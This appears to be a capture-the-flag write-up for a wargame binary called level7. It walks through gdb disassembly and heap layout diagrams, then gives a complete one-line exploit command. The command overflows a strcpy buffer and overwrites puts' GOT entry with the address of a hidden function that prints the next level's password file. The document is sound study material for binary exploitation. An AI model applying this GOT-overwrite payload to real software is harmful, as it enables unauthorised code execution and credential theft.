After several test we see "./level7" takes 2 arguments else it segfault

We notice 2 strcpy

0x080485a0 <+127>:   call   0x80483e0 <strcpy@plt>
0x080485bd <+156>:   call   0x80483e0 <strcpy@plt>

The 1st strcpy takes argv[1] has parameter
The 2nd strcpy takes argv[2] has parameter

The 2nd one will just replace at the address will insert in the overflow of the 1st one at argv[1][20-24] by the one passed in argv[2]

We notice that there is an <fopen> function

0x080485d3 <+178>:   call   0x8048430 <fopen@plt>

followed by a <fgets> function

0x080485eb <+202>:   call   0x80483c0 <fgets@plt>

By dumping the object we can see this :

0x80485c7:   b8 eb 86 04 08            	mov eax, 0x80486eb ; "/home/user/level8/.pass"

Which means that the fopen will open the .pass we need and the <fgets> will read in it.

These 2 functions are followed by a third one which is a <puts> function, that display "~~"

Finally we see a function <m> which is never called that print the result of the previous <fgets>


So the trick here is to use the 1st argument to overflow the buffer and set in argv[1][20-24] the address we wish to modify.

Let's find <puts> and <m> address

(gdb) disas main
[...]
   0x080485f7 <+214>:   call   0x8048400 <puts@plt>
[...]

(gdb) disas 0x8048400
Dump of assembler code for function puts@plt:
   0x08048400 <+0>:     jmp    *0x8049928
   0x08048406 <+6>:     push   $0x28
   0x0804840b <+11>:    jmp    0x80483a0

The address of <puts> is 0x8049928

(gdb) x m
   0x80484f4 <m>:  0x83e58955

The address of <m> is 0x80484f4

Here the address we wish to modify is the GOT address of <puts> (0x08049928) because the function stands right after <fopen> and <fgets> and we need
to reach these function to have our .pass stored before any call to the <m> function.
Then our 2nd argument will simply be the address of the <m> function (0x080484f4)


Heap:

   0     4        8           12           16        24          28           32    36      40         44            48        56
   | 0x1 | &mem2  | PREV_SIZE | CHUNK SIZE | ARGV[1] | PREV_SIZE | CHUNK SIZE | 0x2 | &mem4 | PREV_SIZE | CHUNK SIZE | ARGV[2] | ...
   ^     ^                                 ^                                  ^     ^                                ^
   |     |                                 |                                  |     |                                |
  mem   str                               mem2                               mem3  str2                             mem4


Heap With paylaod:

   0     4        8           12           16    36             40           44           48       56
   | 0x1 | &mem2  | PREV_SIZE | CHUNK SIZE | NOP | GOT ADDR PUTS | PREV_SIZE | CHUNK SIZE | BUFFER | ...
   ^     ^                                 ^     ^      |          
   |     |                                 |     |      |___> ARGV[2] will be copied to GOT ADDR
  mem   str                               mem2  str2                              


./level7 $(python -c "print '\x90'*20 + '\x08\x04\x99\x28'[::-1]") $(python -c "print '\x08\x04\x84\xf4'[::-1]")
